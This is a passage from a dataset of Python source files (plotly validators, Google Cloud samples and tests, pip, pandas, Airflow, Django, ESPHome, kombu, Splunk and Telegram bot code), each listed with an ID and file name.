    In [8]: f(1)
    Out[8]: 2

    In [9]: def g(x):
       ...:     print('x is:',x)
       ...:      

    In [10]: g(1)
    x is: 1

    In [11]: g('hello')
    x is: hello
    """"""


def doctest_multiline3():
    """"""Multiline examples with blank lines.

    In [12]: def h(x):
       ....:     if x>1:
       ....:         return x**2
       ....:     # To leave a blank line in the input, you must mark it
       ....:     # with a comment character:
       ....:     #
       ....:     # otherwise the doctest parser gets confused.
       ....:     else:
       ....:         return -1
       ....:      

    In [13]: h(5)
    Out[13]: 25

    In [14]: h(1)
    Out[14]: -1

    In [15]: h(0)
    Out[15]: -1
   """"""


def doctest_builtin_underscore():
    """"""Defining builtins._ should not break anything outside the doctest
    while also should be working as expected inside the doctest.

    In [1]: import builtins

    In [2]: builtins._ = 42

    In [3]: builtins._
    Out[3]: 42

    In [4]: _
    Out[4]: 42
    """""""
JY373	JY373-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""heatmap"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JD381	JD381-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""hoverlabel"", parent_name=""choroplethmapbox"", **kwargs
    ):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JD186	JD186-lilypond.py	"""""""
    pygments.styles.lilypond
    ~~~~~~~~~~~~~~~~~~~~~~~~

    LilyPond-specific style.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.style import Style
from pygments.token import Token

class LilyPondStyle(Style):
    """"""
    Style for the LilyPond language.
        
    .. versionadded:: 2.11
    """"""

    # Don't show it in the gallery, it's intended for LilyPond
    # input only and doesn't show good output on Python code.
    web_style_gallery_exclude = True

    styles = {
        Token.Text: """",
        Token.Keyword: ""bold"",
        Token.Comment: ""italic #A3AAB2"",
        Token.String: ""#AB0909"",
        Token.String.Escape: ""#C46C6C"",
        Token.String.Symbol: ""noinherit"",
        Token.Pitch: """", #""#911520"",
        Token.Number: ""#976806"", # includes durations
        # A bare 11 is not distinguishable from a number, so we highlight
        # the same.
        Token.ChordModifier: ""#976806"",
        Token.Name.Lvalue: ""#08547A"",
        Token.Name.BackslashReference: ""#08547A"",
        Token.Name.Builtin.MusicCommand: ""bold #08547A"",
        Token.Name.Builtin.PaperVariable: ""bold #6C5A05"",
        Token.Name.Builtin.HeaderVariable: ""bold #6C5A05"",
        Token.Name.Builtin.MusicFunction: ""bold #08547A"",
        Token.Name.Builtin.Clef: ""bold #08547A"",
        Token.Name.Builtin.Scale: ""bold #08547A"",
        Token.Name.Builtin.RepeatType: ""#08547A"",
        Token.Name.Builtin.Dynamic: ""#68175A"",
        Token.Name.Builtin.Articulation: ""#68175A"",
        Token.Name.Builtin.SchemeFunction: ""bold #A83401"",
        Token.Name.Builtin.SchemeBuiltin: ""bold"",
        Token.Name.Builtin.MarkupCommand: ""bold #831E71"",
        Token.Name.Builtin.Context: ""bold #038B8B"",
        Token.Name.Builtin.ContextProperty: ""#038B8B"",
        Token.Name.Builtin.Grob: ""bold #0C7441"",
        Token.Name.Builtin.GrobProperty: ""#0C7441"",
        Token.Name.Builtin.Translator: ""bold #6200A4"",
    }"
JY57	JY57-urls.py	"import os
import string
import urllib.parse
import urllib.request
from typing import Optional

from .compat import WINDOWS


def get_url_scheme(url: str) -> Optional[str]:
    if "":"" not in url:
        return None
    return url.split("":"", 1)[0].lower()


def path_to_url(path: str) -> str:
    """"""
    Convert a path to a file: URL.  The path will be made absolute and have
    quoted path parts.
    """"""
    path = os.path.normpath(os.path.abspath(path))
    url = urllib.parse.urljoin(""file:"", urllib.request.pathname2url(path))
    return url


def url_to_path(url: str) -> str:
    """"""
    Convert a file: URL to a path.
    """"""
    assert url.startswith(
        ""file:""
    ), f""You can only turn file: urls into filenames (not {url!r})""

    _, netloc, path, _, _ = urllib.parse.urlsplit(url)

    if not netloc or netloc == ""localhost"":
        # According to RFC 8089, same as empty authority.
        netloc = """"
    elif WINDOWS:
        # If we have a UNC path, prepend UNC share notation.
        netloc = ""\\\\"" + netloc
    else:
        raise ValueError(
            f""non-local file URIs are not supported on this platform: {url!r}""
        )

    path = urllib.request.url2pathname(netloc + path)

    # On Windows, urlsplit parses the path as something like ""/C:/Users/foo"".
    # This creates issues for path-related functions like io.open(), so we try
    # to detect and strip the leading slash.
    if (
        WINDOWS
        and not netloc  # Not UNC.
        and len(path) >= 3
        and path[0] == ""/""  # Leading slash to strip.
        and path[1] in string.ascii_letters  # Drive letter.
        and path[2:4] in ("":"", "":/"")  # Colon + end of string, or colon + absolute path.
    ):
        path = path[1:]

    return path"
JY515	JY515-custom_types.py	"# Copyright (c) 2014, Oracle and/or its affiliates. All rights reserved.
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License, version 2.0, as
# published by the Free Software Foundation.
#
# This program is also distributed with certain software (including
# but not limited to OpenSSL) that is licensed under separate terms,
# as designated in a particular file or component or in included license
# documentation.  The authors of MySQL hereby grant you an
# additional permission to link the program and your derivative works
# with the separately licensed software that they have included with
# MySQL.
#
# Without limiting anything contained in the foregoing, this file,
# which is part of MySQL Connector/Python, is also subject to the
# Universal FOSS Exception, version 1.0, a copy of which can be found at
# http://oss.oracle.com/licenses/universal-foss-exception.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
# See the GNU General Public License, version 2.0, for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin St, Fifth Floor, Boston, MA 02110-1301  USA

""""""Custom Python types used by MySQL Connector/Python""""""


import sys


class HexLiteral(str):

    """"""Class holding MySQL hex literals""""""

    def __new__(cls, str_, charset='utf8'):
        if sys.version_info[0] == 2:
            hexed = [""%02x"" % ord(i) for i in str_.encode(charset)]
        else:
            hexed = [""%02x"" % i for i in str_.encode(charset)]
        obj = str.__new__(cls, ''.join(hexed))
        obj.charset = charset
        obj.original = str_
        return obj

    def __str__(self):
        return '0x' + self"
JD328	JD328-vision_async_batch_annotate_images.py	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# [START vision_async_batch_annotate_images]

from google.cloud import vision_v1


def sample_async_batch_annotate_images(
    input_image_uri=""gs://cloud-samples-data/vision/label/wakeupcat.jpg"",
    output_uri=""gs://your-bucket/prefix/"",
):
    """"""Perform async batch image annotation.""""""
    client = vision_v1.ImageAnnotatorClient()

    source = {""image_uri"": input_image_uri}
    image = {""source"": source}
    features = [
        {""type_"": vision_v1.Feature.Type.LABEL_DETECTION},
        {""type_"": vision_v1.Feature.Type.IMAGE_PROPERTIES},
    ]

    # Each requests element corresponds to a single image.  To annotate more
    # images, create a request element for each image and add it to
    # the array of requests
    requests = [{""image"": image, ""features"": features}]
    gcs_destination = {""uri"": output_uri}

    # The max number of responses to output in each JSON file
    batch_size = 2
    output_config = {""gcs_destination"": gcs_destination,
                     ""batch_size"": batch_size}

    operation = client.async_batch_annotate_images(requests=requests, output_config=output_config)

    print(""Waiting for operation to complete..."")
    response = operation.result(90)

    # The output is written to GCS with the provided output_uri as prefix
    gcs_output_uri = response.output_config.gcs_destination.uri
    print(""Output written to GCS with prefix: {}"".format(gcs_output_uri))


# [END vision_async_batch_annotate_images]"
JY516	JY516-debug.py	"""""""Event-loop debugging tools.""""""
from __future__ import absolute_import, unicode_literals

from kombu.five import items, string_t
from kombu.utils.eventio import READ, WRITE, ERR
from kombu.utils.functional import reprcall


def repr_flag(flag):
    """"""Return description of event loop flag.""""""
    return '{0}{1}{2}'.format('R' if flag & READ else '',
                              'W' if flag & WRITE else '',
                              '!' if flag & ERR else '')


def _rcb(obj):
    if obj is None:
        return '<missing>'
    if isinstance(obj, string_t):
        return obj
    if isinstance(obj, tuple):
        cb, args = obj
        return reprcall(cb.__name__, args=args)
    return obj.__name__


def repr_active(h):
    """"""Return description of active readers and writers.""""""
    return ', '.join(repr_readers(h) + repr_writers(h))


def repr_events(h, events):
    """"""Return description of events returned by poll.""""""
    return ', '.join(
        '{0}({1})->{2}'.format(
            _rcb(callback_for(h, fd, fl, '(GONE)')), fd,
            repr_flag(fl),
        )
        for fd, fl in events
    )


def repr_readers(h):
    """"""Return description of pending readers.""""""
    return ['({0}){1}->{2}'.format(fd, _rcb(cb), repr_flag(READ | ERR))
            for fd, cb in items(h.readers)]


def repr_writers(h):
    """"""Return description of pending writers.""""""
    return ['({0}){1}->{2}'.format(fd, _rcb(cb), repr_flag(WRITE))
            for fd, cb in items(h.writers)]


def callback_for(h, fd, flag, *default):
    """"""Return the callback used for hub+fd+flag.""""""
    try:
        if flag & READ:
            return h.readers[fd]
        if flag & WRITE:
            if fd in h.consolidate:
                return h.consolidate_callback
            return h.writers[fd]
    except KeyError:
        if default:
            return default[0]
        raise"
JY267	JY267-_line.py	"import _plotly_utils.basevalidators


class LineValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""line"", parent_name=""scatterpolar"", **kwargs):
        super(LineValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Line""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            backoff
                Sets the line back off from the end point of
                the nth line segment (in px). This option is
                useful e.g. to avoid overlap with arrowhead
                markers. With ""auto"" the lines would trim
                before markers if `marker.angleref` is set to
                ""previous"".
            backoffsrc
                Sets the source reference on Chart Studio Cloud
                for `backoff`.
            color
                Sets the line color.
            dash
                Sets the dash style of lines. Set to a dash
                type string (""solid"", ""dot"", ""dash"",
                ""longdash"", ""dashdot"", or ""longdashdot"") or a
                dash length list in px (eg ""5px,10px,2px,2px"").
            shape
                Determines the line shape. With ""spline"" the
                lines are drawn using spline interpolation. The
                other available values correspond to step-wise
                line shapes.
            smoothing
                Has an effect only if `shape` is set to
                ""spline"" Sets the amount of smoothing. 0
                corresponds to no smoothing (equivalent to a
                ""linear"" shape).
            width
                Sets the line width (in px).
"""""",
            ),
            **kwargs,
        )"
JY153	JY153-manager.py	"""""""Manager to read and modify frontend config data in JSON files.
""""""
# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.

import os.path

from notebook.config_manager import BaseJSONConfigManager, recursive_update
from jupyter_core.paths import jupyter_config_dir, jupyter_config_path
from traitlets import Unicode, Instance, List, observe, default
from traitlets.config import LoggingConfigurable


class ConfigManager(LoggingConfigurable):
    """"""Config Manager used for storing notebook frontend config""""""

    # Public API

    def get(self, section_name):
        """"""Get the config from all config sections.""""""
        config = {}
        # step through back to front, to ensure front of the list is top priority
        for p in self.read_config_path[::-1]:
            cm = BaseJSONConfigManager(config_dir=p)
            recursive_update(config, cm.get(section_name))
        return config

    def set(self, section_name, data):
        """"""Set the config only to the user's config.""""""
        return self.write_config_manager.set(section_name, data)

    def update(self, section_name, new_data):
        """"""Update the config only to the user's config.""""""
        return self.write_config_manager.update(section_name, new_data)

    # Private API

    read_config_path = List(Unicode())

    @default('read_config_path')
    def _default_read_config_path(self):
        return [os.path.join(p, 'nbconfig') for p in jupyter_config_path()]

    write_config_dir = Unicode()

    @default('write_config_dir')
    def _default_write_config_dir(self):
        return os.path.join(jupyter_config_dir(), 'nbconfig')

    write_config_manager = Instance(BaseJSONConfigManager)

    @default('write_config_manager')
    def _default_write_config_manager(self):
        return BaseJSONConfigManager(config_dir=self.write_config_dir)

    @observe('write_config_dir')
    def _update_write_config_dir(self, change):
        self.write_config_manager = BaseJSONConfigManager(config_dir=self.write_config_dir)"
JY290	JY290-0082_2_1_0_increase_pool_name_size_in_taskinstance.py	"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
""""""Increase maximum length of pool name in ``task_instance`` table to ``256`` characters

Revision ID: 90d1635d7b86
Revises: 2e42bb497a22
Create Date: 2021-04-05 09:37:54.848731

""""""
from __future__ import annotations

import sqlalchemy as sa
from alembic import op

# revision identifiers, used by Alembic.
revision = ""90d1635d7b86""
down_revision = ""2e42bb497a22""
branch_labels = None
depends_on = None
airflow_version = ""2.1.0""


def upgrade():
    """"""Apply Increase maximum length of pool name in ``task_instance`` table to ``256`` characters""""""
    with op.batch_alter_table(""task_instance"") as batch_op:
        batch_op.alter_column(""pool"", type_=sa.String(256), nullable=False)


def downgrade():
    """"""Unapply Increase maximum length of pool name in ``task_instance`` table to ``256`` characters""""""
    conn = op.get_bind()
    if conn.dialect.name == ""mssql"":
        with op.batch_alter_table(""task_instance"") as batch_op:
            batch_op.drop_index(""ti_pool"")
            batch_op.alter_column(""pool"", type_=sa.String(50), nullable=False)
            batch_op.create_index(""ti_pool"", [""pool""])
    else:
        with op.batch_alter_table(""task_instance"") as batch_op:
            batch_op.alter_column(""pool"", type_=sa.String(50), nullable=False)"
JD176	JD176-introspection.py	"import cx_Oracle

from django.db.backends.oracle.introspection import DatabaseIntrospection
from django.utils.functional import cached_property


class OracleIntrospection(DatabaseIntrospection):
    # Associating any OBJECTVAR instances with GeometryField. This won't work
    # right on Oracle objects that aren't MDSYS.SDO_GEOMETRY, but it is the
    # only object type supported within Django anyways.
    @cached_property
    def data_types_reverse(self):
        return {
            **super().data_types_reverse,
            cx_Oracle.OBJECT: ""GeometryField"",
        }

    def get_geometry_type(self, table_name, description):
        with self.connection.cursor() as cursor:
            # Querying USER_SDO_GEOM_METADATA to get the SRID and dimension information.
            try:
                cursor.execute(
                    'SELECT ""DIMINFO"", ""SRID"" FROM ""USER_SDO_GEOM_METADATA"" '
                    'WHERE ""TABLE_NAME""=%s AND ""COLUMN_NAME""=%s',
                    (table_name.upper(), description.name.upper()),
                )
                row = cursor.fetchone()
            except Exception as exc:
                raise Exception(
                    ""Could not find entry in USER_SDO_GEOM_METADATA ""
                    'corresponding to ""%s"".""%s""' % (table_name, description.name)
                ) from exc

            # TODO: Research way to find a more specific geometry field type for
            # the column's contents.
            field_type = ""GeometryField""

            # Getting the field parameters.
            field_params = {}
            dim, srid = row
            if srid != 4326:
                field_params[""srid""] = srid
            # Size of object array (SDO_DIM_ARRAY) is number of dimensions.
            dim = dim.size()
            if dim != 2:
                field_params[""dim""] = dim
        return field_type, field_params"
JY500	JY500-__init__.py	"import esphome.codegen as cg
import esphome.config_validation as cv

from esphome.components import binary_sensor, display
from esphome.const import CONF_PAGE_ID

from .. import touchscreen_ns, CONF_TOUCHSCREEN_ID, Touchscreen, TouchListener

DEPENDENCIES = [""touchscreen""]

TouchscreenBinarySensor = touchscreen_ns.class_(
    ""TouchscreenBinarySensor"",
    binary_sensor.BinarySensor,
    cg.Component,
    TouchListener,
    cg.Parented.template(Touchscreen),
)

CONF_X_MIN = ""x_min""
CONF_X_MAX = ""x_max""
CONF_Y_MIN = ""y_min""
CONF_Y_MAX = ""y_max""


def validate_coords(config):
    if (
        config[CONF_X_MAX] < config[CONF_X_MIN]
        or config[CONF_Y_MAX] < config[CONF_Y_MIN]
    ):
        raise cv.Invalid(
            f""{CONF_X_MAX} is less than {CONF_X_MIN} or {CONF_Y_MAX} is less than {CONF_Y_MIN}""
        )
    return config


CONFIG_SCHEMA = cv.All(
    binary_sensor.binary_sensor_schema(TouchscreenBinarySensor)
    .extend(
        {
            cv.GenerateID(CONF_TOUCHSCREEN_ID): cv.use_id(Touchscreen),
            cv.Required(CONF_X_MIN): cv.int_range(min=0, max=2000),
            cv.Required(CONF_X_MAX): cv.int_range(min=0, max=2000),
            cv.Required(CONF_Y_MIN): cv.int_range(min=0, max=2000),
            cv.Required(CONF_Y_MAX): cv.int_range(min=0, max=2000),
            cv.Optional(CONF_PAGE_ID): cv.use_id(display.DisplayPage),
        }
    )
    .extend(cv.COMPONENT_SCHEMA),
    validate_coords,
)


async def to_code(config):
    var = await binary_sensor.new_binary_sensor(config)
    await cg.register_component(var, config)
    await cg.register_parented(var, config[CONF_TOUCHSCREEN_ID])

    cg.add(
        var.set_area(
            config[CONF_X_MIN],
            config[CONF_X_MAX],
            config[CONF_Y_MIN],
            config[CONF_Y_MAX],
        )
    )

    if CONF_PAGE_ID in config:
        page = await cg.get_variable(config[CONF_PAGE_ID])
        cg.add(var.set_page(page))"
JD366	JD366-import_products_bq_test.py	"# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import re
import subprocess

from setup_product.setup_cleanup import (
    create_bq_dataset,
    create_bq_table,
    delete_bq_table,
    upload_data_to_bq_table,
)


def test_import_products_bq(table_id_prefix):
    dataset = ""products""
    valid_products_table = f""{table_id_prefix}products""
    product_schema = ""../resources/product_schema.json""
    valid_products_source_file = ""../resources/products.json""

    create_bq_dataset(dataset)
    create_bq_table(dataset, valid_products_table, product_schema)
    upload_data_to_bq_table(
        dataset, valid_products_table, valid_products_source_file, product_schema
    )

    output = str(
        subprocess.check_output(
            f""python import_products_big_query_table.py {dataset} {valid_products_table}"",
            shell=True,
        )
    )

    delete_bq_table(dataset, valid_products_table)

    assert re.match("".*import products from big query table request.*"", output)
    assert re.match("".*the operation was started.*"", output)
    assert re.match(
        "".*projects/.*/locations/global/catalogs/default_catalog/branches/0/operations/import-products.*"",
        output,
    )

    assert re.match("".*number of successfully imported products.*?316.*"", output)
    assert re.match("".*number of failures during the importing.*?0.*"", output)"
JY279	JY279-speedtest.py	"#
# Copyright (C) 2021-2022 by TeamYukki@Github, < https://github.com/TeamYukki >.
#
# This file is part of < https://github.com/TeamYukki/YukkiMusicBot > project,
# and is released under the ""GNU v3.0 License Agreement"".
# Please see < https://github.com/TeamYukki/YukkiMusicBot/blob/master/LICENSE >
#
# All rights reserved.
#
# Ported by @mrismanaziz
# FROM File-Sharing-Man < https://github.com/mrismanaziz/File-Sharing-Man/ >
# t.me/Lunatic0de & t.me/SharingUserbot
#

import os

import speedtest
import wget
from pyrogram import filters
from pyrogram.types import Message

from bot import Bot
from config import ADMINS


@Bot.on_message(filters.command(""speedtest"") & filters.user(ADMINS))
async def run_speedtest(client: Bot, message: Message):
    m = await message.reply_text(""⚡️ Running Server Speedtest"")
    try:
        test = speedtest.Speedtest()
        test.get_best_server()
        m = await m.edit(""⚡️ Running Download Speedtest.."")
        test.download()
        m = await m.edit(""⚡️ Running Upload Speedtest..."")
        test.upload()
        test.results.share()
        result = test.results.dict()
    except Exception as e:
        await m.edit(e)
        return
    m = await m.edit(""🔄 Sharing Speedtest Results"")
    path = wget.download(result[""share""])

    output = f""""""💡 <b>SpeedTest Results</b>
    
<u><b>Client:<b></u>
<b>ISP:</b> {result['client']['isp']}
<b>Country:</b> {result['client']['country']}
  
<u><b>Server:</b></u>
<b>Name:</b> {result['server']['name']}
<b>Country:</b> {result['server']['country']}, {result['server']['cc']}
<b>Sponsor:</b> {result['server']['sponsor']}
⚡️ <b>Ping:</b> {result['ping']}""""""
    msg = await client.send_photo(
        chat_id=message.chat.id, photo=path, caption=output
    )
    os.remove(path)
    await m.delete()"
JD136	JD136-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""splom"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JD320	JD320-speech_to_storage_beta_test.py	"# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import uuid

from google.cloud import speech_v1p1beta1 as speech
from google.cloud import storage
import pytest

import speech_to_storage_beta

STORAGE_URI = ""gs://cloud-samples-data/speech/brooklyn_bridge.raw""


storage_client = storage.Client()

BUCKET_UUID = str(uuid.uuid4())[:8]
BUCKET_NAME = f""speech-{BUCKET_UUID}""
BUCKET_PREFIX = ""export-transcript-output-test""
DELIMETER = None

INPUT_STORAGE_URI = ""gs://cloud-samples-data/speech/commercial_mono.wav""
OUTPUT_STORAGE_URI = f""gs://{BUCKET_NAME}/{BUCKET_PREFIX}""
encoding = speech.RecognitionConfig.AudioEncoding.LINEAR16
sample_rate_hertz = 8000
language_code = ""en-US""


def test_export_transcript_to_storage_beta(bucket, capsys):
    results = speech_to_storage_beta.export_transcript_to_storage_beta(
        INPUT_STORAGE_URI,
        OUTPUT_STORAGE_URI,
        encoding,
        sample_rate_hertz,
        language_code,
        BUCKET_NAME,
        BUCKET_PREFIX,
    )
    assert len(results) > 0


@pytest.fixture
def bucket():
    """"""Yields a bucket that is deleted after the test completes.""""""
    bucket = None
    while bucket is None or bucket.exists():
        bucket = storage_client.bucket(BUCKET_NAME)
    bucket.storage_class = ""COLDLINE""
    storage_client.create_bucket(bucket, location=""us"")
    yield bucket

    blobs = storage_client.list_blobs(BUCKET_NAME, prefix=BUCKET_PREFIX)

    for blob in blobs:
        blob.delete()

    bucket.delete(force=True)"
JY477	JY477-util.py	"from __future__ import annotations

import numpy as np

from pandas._typing import NumpyIndexT

from pandas.core.dtypes.common import is_list_like


def cartesian_product(X) -> list[np.ndarray]:
    """"""
    Numpy version of itertools.product.
    Sometimes faster (for large inputs)...

    Parameters
    ----------
    X : list-like of list-likes

    Returns
    -------
    product : list of ndarrays

    Examples
    --------
    >>> cartesian_product([list('ABC'), [1, 2]])
    [array(['A', 'A', 'B', 'B', 'C', 'C'], dtype='<U1'), array([1, 2, 1, 2, 1, 2])]

    See Also
    --------
    itertools.product : Cartesian product of input iterables.  Equivalent to
        nested for-loops.
    """"""
    msg = ""Input must be a list-like of list-likes""
    if not is_list_like(X):
        raise TypeError(msg)
    for x in X:
        if not is_list_like(x):
            raise TypeError(msg)

    if len(X) == 0:
        return []

    lenX = np.fromiter((len(x) for x in X), dtype=np.intp)
    cumprodX = np.cumproduct(lenX)

    if np.any(cumprodX < 0):
        raise ValueError(""Product space too large to allocate arrays!"")

    a = np.roll(cumprodX, 1)
    a[0] = 1

    if cumprodX[-1] != 0:
        b = cumprodX[-1] / cumprodX
    else:
        # if any factor is empty, the cartesian product is empty
        b = np.zeros_like(cumprodX)

    # error: Argument of type ""int_"" cannot be assigned to parameter ""num"" of
    # type ""int"" in function ""tile_compat""
    return [
        tile_compat(
            np.repeat(x, b[i]),
            np.product(a[i]),  # pyright: ignore[reportGeneralTypeIssues]
        )
        for i, x in enumerate(X)
    ]


def tile_compat(arr: NumpyIndexT, num: int) -> NumpyIndexT:
    """"""
    Index compat for np.tile.

    Notes
    -----
    Does not support multi-dimensional `num`.
    """"""
    if isinstance(arr, np.ndarray):
        return np.tile(arr, num)

    # Otherwise we have an Index
    taker = np.tile(np.arange(len(arr)), num)
    return arr.take(taker)"
JD156	JD156-request.py	"from splunk.persistconn.application import PersistentServerConnectionApplication
import json
import requests
import logging


class request(PersistentServerConnectionApplication):
    def __init__(self, command_line, command_arg, logger=None):
        super(PersistentServerConnectionApplication, self).__init__()
        self.logger = logger
        if self.logger == None:
            self.logger = logging.getLogger(f""splunk.appserver.badmsc"")

        PersistentServerConnectionApplication.__init__(self)

    def handle(self, in_string):
        args = json.loads(in_string)

        if args[""method""] != ""POST"":
            self.logger.info(f""Method {args['method']} not allowed"")
            return {
                ""payload"": ""Method Not Allowed"",
                ""status"": 405,
                ""headers"": {""Allow"": ""POST""},
            }

        try:
            options = json.loads(args[""payload""])
        except Exception as e:
            self.logger.info(f""Invalid payload. {e}"")
            return {""payload"": ""Invalid JSON payload"", ""status"": 400}

        self.logger.info(args[""payload""])

        # Handle local requests by adding FQDN and auth token
        if options[""url""].startswith(""/services""):
            options[""verify""] = False
            options[""url""] = f""{args['server']['rest_uri']}{options['url']}""
            options[""headers""][
                ""Authorization""
            ] = f""Splunk {args['session']['authtoken']}""
        elif not (
            options[""url""].startswith(""https://"")
            or options[""url""].startswith(""http://"")
        ):
            options[""url""] = f""https://{options['url']}""

        try:
            r = requests.request(**options)
            self.logger.info(f""{r.status_code} {r.text}"")
            return {""payload"": r.text, ""status"": r.status_code}
        except Exception as e:
            self.logger.info(f""Request failed. {e}"")
            return {""payload"": str(e), ""status"": 500}"
JY302	JY302-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""scatter"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
